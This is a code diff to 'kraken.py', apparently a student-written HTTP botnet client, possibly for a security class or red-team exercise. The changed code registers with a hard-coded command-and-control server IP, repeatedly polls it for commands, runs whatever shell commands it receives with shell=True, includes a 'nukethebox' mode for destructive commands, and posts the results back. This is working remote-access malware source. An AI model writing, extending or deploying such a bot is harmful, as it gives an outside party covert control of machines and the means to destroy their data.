@@ -2,7 +2,7 @@
 # Amanda Brown (aeb6590) 
 # kraken.py (HTTP bot) 
 
-# import necessary libraries 
+# Import necessary libraries 
 import json
 import socket
 import requests
@@ -18,12 +18,18 @@ class Bot:
         self.uuid = uuid
 
 # Execute a passed in shell command 
-def shellExec(command): 
-    subprocess.call(command)
+def shellExec(command):
+    command = "'" + command + "'"
+    print(command)
+    resp = subprocess.call(command, shell=True)
+    return resp
 
 # Execute the passed in nuke command
 def nuke(command):
-    subprocess.call(command)
+    command = "'" + command + "'"
+    print(command) 
+    resp = subprocess.call(command, shell=True)
+    return resp
 
 # Figure the bot's sleep time
 def sleepTime(ret):
@@ -45,36 +51,47 @@ def main():
     
     # Instantiate the bot and give it a uuid 
     kraken = Bot()
-    kraken.uuid = getUUID()
+    kraken.uuid = "aeb"
 
     host = socket.gethostname() 
     server = 'http://129.21.115.114:8080'
     
     # Send the bot info to the server
-    botInfo = {'uuid':kraken.uuid, 'interval':5, 'interval_delta':5, 'server':server,'hostname':host, 'interface':'eth0'}
-    
+    botInfo = {'uuid':kraken.uuid, 'config_interval':5, 'config_intervaldelta':5, 'config_servers':server,'facts_hostname':host, 'facts_interfaces':'eth0'}
+    register = requests.post(server + '/register', data=botInfo)
+    status = register.status_code
+    print(register.text)
+
     # Keep attempting to connect
     while (status != 200):
-        register = requests.post(server + '/register', botInfo)
-        status = register.status_code
         time.sleep(5)
+        register = requests.post(server + '/register', data=botInfo)
+        status = register.status_code
 
     # Keep looping for commands 
     while (True):
-        cmd = requests.get(server + '/getcommand')
+        print("here")
+        cmd = requests.post(server + '/getcommand', data=botInfo)
         cmd = cmd.text
+        print(cmd)
         parsedCmd = json.loads(cmd)
-        
+        resp = "" 
+
         # If server replies with shell execution command
         if parsedCmd.get("mode") == "shell":
-            resp = shellExec(parsedCmd.get("params"))
-        
+            print("before shell exec")
+            resp = shellExec(parsedCmd.get("command"))
+            print(resp) 
+
         # If server replies with nuke the box command 
         if parsedCmd.get("mode") == "nukethebox": 
-            resp = nuke(parsedCmd.get("params"))
-        
+            print("before the nuking")
+            resp = nuke(parsedCmd.get("command"))
+            print(resp)
+
+        # Send results back 
         botSend = {'uuid':kraken.uuid,'uaid':parsedCmd.get("uaid"), 'error':0, 'resp':resp}
-        ret = requests.post(server,botSend)
+        ret = requests.post(server + '/postresults',data=botSend)
         
         # Time to sleep 
         TTS = sleepTime(ret.status_code) 
